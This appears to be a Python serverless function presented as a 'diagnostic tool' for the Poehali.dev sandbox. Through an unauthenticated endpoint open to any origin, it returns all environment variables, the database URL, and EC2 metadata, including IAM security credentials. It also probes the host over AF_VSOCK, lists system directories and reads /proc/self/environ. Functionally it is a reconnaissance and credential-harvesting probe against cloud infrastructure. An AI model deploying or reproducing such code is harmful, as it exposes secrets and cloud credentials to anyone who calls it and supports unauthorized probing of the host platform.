import json
import os
import socket
from typing import Dict, Any, Optional
import urllib.request
import urllib.error

def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''
    Business: Sandbox environment diagnostic tool for Poehali.dev testing
    Args: event - dict with httpMethod, queryStringParameters
          context - object with request_id, function_name attributes
    Returns: HTTP response with environment diagnostics
    '''
    method: str = event.get('httpMethod', 'GET')
    
    cors_headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '86400',
        'Content-Type': 'application/json'
    }
    
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': cors_headers,
            'body': ''
        }
    
    params = event.get('queryStringParameters') or {}
    path = params.get('path', 'help')
    
    try:
        result = execute_diagnostic(path, context)
        return {
            'statusCode': 200,
            'headers': cors_headers,
            'isBase64Encoded': False,
            'body': json.dumps(result, indent=2, ensure_ascii=False, default=str)
        }
    except Exception as e:
        error_result = {
            'error': str(e),
            'type': type(e).__name__,
            'path': path
        }
        return {
            'statusCode': 500,
            'headers': cors_headers,
            'isBase64Encoded': False,
            'body': json.dumps(error_result, indent=2, ensure_ascii=False)
        }

def execute_diagnostic(path: str, context: Any) -> Dict[str, Any]:
    '''Execute diagnostic command based on path parameter'''
    
    if path == 'help':
        return {
            'available_commands': [
                {'path': 'help', 'description': 'List all available commands'},
                {'path': 'env', 'description': 'Full os.environ dump'},
                {'path': 'db', 'description': 'Database connection info'},
                {'path': 'meta', 'description': 'EC2 metadata service queries'},
                {'path': 'vsock', 'description': 'AF_VSOCK connection test'},
                {'path': 'files', 'description': 'Filesystem exploration'},
                {'path': 'ping', 'description': 'Health check'}
            ]
        }
    
    elif path == 'env':
        return {
            'environment_variables': dict(os.environ),
            'count': len(os.environ)
        }
    
    elif path == 'db':
        return get_db_info()
    
    elif path == 'meta':
        return get_metadata_info()
    
    elif path == 'vsock':
        return test_vsock()
    
    elif path == 'files':
        return explore_filesystem()
    
    elif path == 'ping':
        return {
            'status': 'alive',
            'request_id': context.request_id,
            'function_name': context.function_name,
            'memory_limit_mb': context.memory_limit_in_mb
        }
    
    else:
        return {'error': f'Unknown path: {path}', 'use': '?path=help'}

def get_db_info() -> Dict[str, Any]:
    '''Get database connection information'''
    try:
        import psycopg2
        database_url = os.environ.get('DATABASE_URL', 'NOT_FOUND')
        
        result = {
            'DATABASE_URL': database_url,
            'connection_attempt': 'attempting...'
        }
        
        if database_url != 'NOT_FOUND':
            try:
                conn = psycopg2.connect(database_url)
                result['connection_status'] = 'SUCCESS'
                result['dsn_parameters'] = conn.get_dsn_parameters()
                
                with conn.cursor() as cur:
                    cur.execute('SELECT version();')
                    result['server_version'] = cur.fetchone()[0]
                
                conn.close()
            except Exception as e:
                result['connection_error'] = str(e)
        
        return result
    except ImportError:
        return {'error': 'psycopg2 not installed', 'DATABASE_URL': os.environ.get('DATABASE_URL', 'NOT_FOUND')}

def get_metadata_info() -> Dict[str, Any]:
    '''Query EC2 metadata service'''
    metadata_paths = [
        'instance-id',
        'hostname',
        'local-ipv4',
        'public-ipv4',
        'ami-id',
        'instance-type',
        'placement/availability-zone',
        'iam/security-credentials/',
        'identity-credentials/ec2/info'
    ]
    
    results = {}
    base_url = 'http://169.254.169.254/latest/meta-data/'
    
    for path in metadata_paths:
        try:
            req = urllib.request.Request(base_url + path, headers={'User-Agent': 'poehali-diagnostic'})
            with urllib.request.urlopen(req, timeout=2) as response:
                results[path] = response.read().decode('utf-8')
        except Exception as e:
            results[path] = f'ERROR: {str(e)}'
    
    try:
        doc_req = urllib.request.Request('http://169.254.169.254/latest/dynamic/instance-identity/document')
        with urllib.request.urlopen(doc_req, timeout=2) as response:
            results['instance-identity-document'] = json.loads(response.read().decode('utf-8'))
    except Exception as e:
        results['instance-identity-document'] = f'ERROR: {str(e)}'
    
    return results

def test_vsock() -> Dict[str, Any]:
    '''Test AF_VSOCK connection'''
    try:
        if not hasattr(socket, 'AF_VSOCK'):
            return {'error': 'AF_VSOCK not available on this system'}
        
        sock = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
        sock.settimeout(2)
        
        try:
            sock.connect((3, 8088))
            sock.sendall(b'PING\n')
            response = sock.recv(1024)
            sock.close()
            return {
                'status': 'SUCCESS',
                'response': response.decode('utf-8', errors='replace')
            }
        except Exception as e:
            sock.close()
            return {
                'status': 'FAILED',
                'error': str(e)
            }
    except Exception as e:
        return {'error': f'VSOCK test failed: {str(e)}'}

def explore_filesystem() -> Dict[str, Any]:
    '''Explore filesystem paths'''
    paths_to_check = [
        '/function',
        '/function/code',
        '/function/runtime',
        '/tmp',
        '/var/runtime',
        '/opt',
        '/usr/local',
        '/',
        os.getcwd()
    ]
    
    results = {}
    
    for path in paths_to_check:
        try:
            if os.path.exists(path):
                items = os.listdir(path)
                results[path] = {
                    'exists': True,
                    'count': len(items),
                    'items': items[:50]
                }
            else:
                results[path] = {'exists': False}
        except Exception as e:
            results[path] = {'error': str(e)}
    
    try:
        with open('/proc/self/environ', 'r') as f:
            results['/proc/self/environ'] = f.read().replace('\x00', '\n')
    except Exception as e:
        results['/proc/self/environ'] = {'error': str(e)}
    
    return results
